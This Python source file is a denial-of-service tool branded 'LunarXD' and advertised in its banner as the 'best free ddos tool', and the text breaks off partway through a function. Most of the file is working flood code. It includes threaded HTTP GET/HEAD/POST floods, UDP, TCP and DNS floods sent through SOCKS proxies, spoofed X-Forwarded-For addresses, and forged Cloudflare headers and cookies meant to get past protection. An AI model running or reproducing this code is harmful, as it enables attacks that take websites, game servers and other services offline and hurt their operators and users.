import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import subprocess
from pystyle import *
from PIL import Image
from colorama import Fore
import cv2
import numpy as np
import struct
import binascii
import warnings
import hashlib
import shutil
import base64

warnings.filterwarnings("ignore")

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

def clearcs():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
    ASCII_CHARS = "█▇▆▅▄▃▂▁ "  

    size = shutil.get_terminal_size(fallback=(100, 40))
    term_width, term_height = size.columns, size.lines
    frame_width = term_width - 2

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("Error: Couldn't open video.")
        return False

    start_time = time.time()
    while cap.isOpened():
        if time.time() - start_time > duration:
            break

        ret, frame = cap.read()
        if not ret:
            break

        pil_image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        width, height = pil_image.size
        aspect_ratio = height / width

        new_width = frame_width
        new_height = int(aspect_ratio * new_width * 0.5)
        new_height = min(new_height, term_height - 2)

        resized_image = pil_image.resize((new_width, new_height), Image.LANCZOS)
        resized_array = np.array(resized_image)

        gray = cv2.cvtColor(resized_array, cv2.COLOR_RGB2GRAY)
        intensities = gray.flatten()

        if intensities.max() != intensities.min():
            intensities = (intensities - intensities.min()) * 255 / (intensities.max() - intensities.min())
        else:
            intensities[:] = 0

        colors = resized_array.reshape(-1, 3)

        ascii_frame = ""
        for i in range(len(intensities)):
            char_idx = int((intensities[i] / 255) * (len(ASCII_CHARS) - 1))
            char = ASCII_CHARS[char_idx]

            r, g, b = colors[i]
            ascii_frame += f"\033[38;2;{r};{g};{b}m{char}"

            if (i + 1) % new_width == 0:
                ascii_frame += "\n"

        ascii_frame += "\033[0m"

        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_frame, end='', flush=True)
        time.sleep(frame_delay)

    cap.release()
    return True
    
def purple_to_green(text):
    start_color = (128, 0, 128)  # Purple
    end_color = (0, 255, 0)      # Green
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient
    
def gold(text):
    start_color = (255, 215, 0)  # Rich Gold
    end_color = (255, 245, 200)  # Light Gold
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient
    
def yellow_to_white(text):
    start_color = (255, 255, 0)  # Yellow
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gray_to_white(text):
    start_color = (128, 128, 128)  # Gray
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def green_to_white(text):
    start_color = (0, 255, 0)  # Green
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient
    
def runbanner():
    print(Colorate.Horizontal(Colors.cyan_to_blue, ("""╦  ╦ ╦╔╗╔╔═╗╦═╗
║  ║ ║║║║╠═╣╠╦╝
╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭""")))

def bannerm2():
    banner2 = fr"""
             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝
   
 ⏾⋆.˚ 𝓙𝓸𝓲𝓷    𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/𝓫𝓲𝓸𝓼𝓶𝓸𝓼𝓷𝓽𝓻  ⏾⋆.˚
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner2)))

def bannerm():
    cuser = input(Colorate.Horizontal(Colors.cyan_to_blue, "Username  ➤ "))
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    banner = fr"""
ʟᴜɴᴀʀxᴅ  •  ꜱᴇʀᴠɪɴɢ:  @{cuser}  ➵  ᴇxᴘɪʀʏ  :  ɴᴇᴠᴇʀ

             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝
   
 ⏾⋆.˚ 𝓙𝓸𝓲𝓷    𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/𝓫𝓲𝓸𝓼𝓶𝓸𝓼𝓷𝓽𝓻  ⏾⋆.˚
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner)))

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8 | iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
]

proxy_ver = "5"  # Default to SOCKS5
brute = False
out_file = "proxies.txt"  # Hardcoded proxy file
thread_num = 1500
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice

def load_proxies():
    global proxies
    try:
        with open(out_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Proxy file is empty."))
            return False
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to load proxy file: {e}"))
        return False

def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_port=None):
    if not proxies:
        print(Colorate.Horizontal(Colors.cyan_to_blue, "> No proxies loaded. Cannot start attack."))
        return
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cc":
        for _ in range(thread_num):
            th = threading.Thread(target=cc, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "udpflood":
        for _ in range(thread_num):
            th = threading.Thread(target=udpflood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "tcpflood":
        for _ in range(thread_num):
            th = threading.Thread(target=tcpflood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "dns":
        for _ in range(thread_num):
            th = threading.Thread(target=dns, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "uambypass":
        for _ in range(thread_num):
            th = threading.Thread(target=uambypass, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "browser":
        for _ in range(thread_num):
            th = threading.Thread(target=browser, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "home":
        for _ in range(thread_num):
            th = threading.Thread(target=home, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cfbypass":
        for _ in range(thread_num):
            th = threading.Thread(target=cfbypass, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "tls":
        for _ in range(thread_num):
            th = threading.Thread(target=tls, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "udp-kill":
        for _ in range(thread_num):
            th = threading.Thread(target=udp_kill, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "ovh":
        for _ in range(thread_num):
            th = threading.Thread(target=ovh, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "dgb":
        for _ in range(thread_num):
            th = threading.Thread(target=dgb, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "http-storm":
        for _ in range(thread_num):
            th = threading.Thread(target=http_storm, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "api-killer":
        for _ in range(thread_num):
            th = threading.Thread(target=api_killer, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "icmp-blast":
        for _ in range(thread_num):
            th = threading.Thread(target=icmp_blast, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "syn-strike":
        for _ in range(thread_num):
            th = threading.Thread(target=syn_strike, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "game-crash":
        for _ in range(thread_num):
            th = threading.Thread(target=game_crash, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "lobby-flood":
        for _ in range(thread_num):
            th = threading.Thread(target=lobby_flood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "discord":
        for _ in range(thread_num):
            th = threading.Thread(target=discord, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
    return str(Intn(0, 271400281257))

def GenReqHeader(method):
    global data, target, path
    header = ""
    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: " + str(cookies) + "\r\n"
        accept = Choice(acceptall)
        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + getuseragent() + "\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + getuseragent() + "\r\n"
        accept = Choice(acceptall)
        if data == "":
            data = str(random._urandom(1024))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        if cookies != "":
            length += "Cookies: " + str(cookies) + "\r\n"
        header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header

def ParseUrl(original_url, is_layer4=False):
    global target, path, port, protocol
    original_url = original_url.strip()
    path = "/"
    protocol = "http"
    port = 80

    if is_layer4:
        try:
            parts = original_url.split(":")
            socket.inet_aton(parts[0])  
            target = parts[0]
            if len(parts) > 1:
                port = int(parts[1])
            return True
        except (socket.error, ValueError):
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid IP or port format. Use: <IP>[:<port>]"))
            return False
    else:
        if original_url[:7] == "http://":
            url = original_url[7:]
            protocol = "http"
        elif original_url[:8] == "https://":
            url = original_url[8:]
            protocol = "https"
        else:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid URL format. Use: http:// or https://"))
            return False
        tmp = url.split("/")
        website = tmp[0]
        check = website.split(":")
        if len(check) != 1:
            port = int(check[1])
        else:
            if protocol == "https":
                port = 443
        target = check[0]
        if len(tmp) > 1:
            path = url.replace(website, "", 1)
        return True

def solve_captcha(response_text):
    if "captcha" not in response_text.lower():
        return None
    captcha_key = hashlib.md5((response_text + str(random.randint(1, 10000))).encode()).hexdigest()[:8]
    token = base64.b64encode(captcha_key.encode()).decode()
    return {"captcha_token": token}

def setup_socket(proxy_type, proxy):
    s = socks.socksocket()
    proxy_ip, proxy_port = proxy.split(":")
    if proxy_type == 4:
        s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
    elif proxy_type == 5:
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    elif proxy_type == 0:
        s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
    if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(2)
    return s

def cc(event, proxy_type):
    global proxies
    header = GenReqHeader("get")
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def head(event, proxy_type):
    global proxies
    header = GenReqHeader("head")
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = head_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def post(event, proxy_type):
    global proxies
    request = GenReqHeader("post")
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def udpflood(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_random_payload(1024),
        generate_random_payload(2048),
        generate_random_payload(512),
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.settimeout(2)
            for _ in range(1000):
                payload = Choice(payloads)
                s.sendto(payload, (target_ip, target_port))
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("", Intn(1024, 65535)))
            s.close()
        except:
            if s:
                s.close()

def tcpflood(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_random_payload(1024),
        generate_random_payload(4096),
        b"SYN" * 1000,
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            for _ in range(1000):
                payload = Choice(payloads)
                s.send(payload)
                if random.random() < 0.1:
                    s.close()
                    s = setup_socket(proxy_type, proxy)
                    s.connect((target_ip, target_port))
            s.close()
        except:
            if s:
                s.close()

def dns(event, proxy_type, target_ip, target_port):
    global proxies
    dns_queries = [
        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x01\x00\x01",
        b"\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x10\x00\x01",
        b"\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(f"test{Intn(1,1000)}.com".encode()) + b"\x00\x00\x01\x00\x01",
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.settimeout(2)
            for _ in range(1000):
                query = Choice(dns_queries)
                s.sendto(query, (target_ip, target_port if target_port else 53))
                s.bind(("", Intn(1024, 65535)))
            s.close()
        except:
            if s:
                s.close()

def uambypass(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(10)]
    spoofed_ips = [spoof_source_ip() for _ in range(10)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                header = base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") + f"X-Forwarded-For: {ip}\r\n"
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def browser(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get").strip()
    session_id = binascii.hexlify(os.urandom(16)).decode()
    user_agents = [getuseragent() for _ in range(20)]
    extra_headers = (
        f"Cache-Control: no-cache\r\n"
        f"Pragma: no-cache\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Cookie: session_id={session_id}\r\n"
    )
    base_request = f"GET {{path}} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\n{extra_headers}"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                ua = Choice(user_agents)
                full_path = path + add + randomurl()
                request = (base_request.format(path=full_path) + f"User-Agent: {ua}\r\n\r\n").encode()
                sent = s.send(request)
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def home(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    spoofed_ips = [spoof_source_ip() for _ in range(15)]
    home_headers = (
        f"X-Home-Connection: {random.randint(1000, 9999)}\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Upgrade-Insecure-Requests: 1\r\n"
    )
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                ip = Choice(spoofed_ips)
                header = base_header + home_headers + f"X-Forwarded-For: {ip}\r\n"
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def cfbypass(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    cf_headers = (
        f"CF-RAY: {binascii.hexlify(os.urandom(8)).decode()}\r\n"
        f"CF-Visitor: {random.choice(['http', 'https'])}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        f"Sec-Fetch-Site: same-origin\r\n"
        f"Sec-Fetch-Mode: navigate\r\n"
        f"Sec-Fetch-User: ?1\r\n"
        f"Sec-Fetch-Dest: document\r\n"
    )
    user_agents = [getuseragent() for _ in range(20)]
    spoofed_ips = [spoof_source_ip() for _ in range(20)]
    session_id = binascii.hexlify(os.urandom(16)).decode()
    cookies = f"__cfduid={binascii.hexlify(os.urandom(20)).decode()}; session={session_id}"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            initial_request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\nCookie: {cookies}\r\n\r\n"
            s.send(str.encode(initial_request))
            response = s.recv(4096).decode(errors='ignore')
            captcha_solution = solve_captcha(response)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                header = (
                    base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") +
                    cf_headers +
                    f"X-Forwarded-For: {ip}\r\n" +
                    f"Cookie: {cookies}\r\n"
                )
                if captcha_solution:
                    header += f"X-Captcha-Solution: {captcha_solution['captcha_token']}\r\n"
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
                if random.random() < 0.05:
                    session_id = binascii.hexlify(os.urandom(16)).decode()
                    cookies = f"__cfduid={binascii.hexlify(os.urandom(20)).decode()}; session={session_id}"
            s.close()
        except:
            if s:
                s.close()

def tls(event, proxy_type):
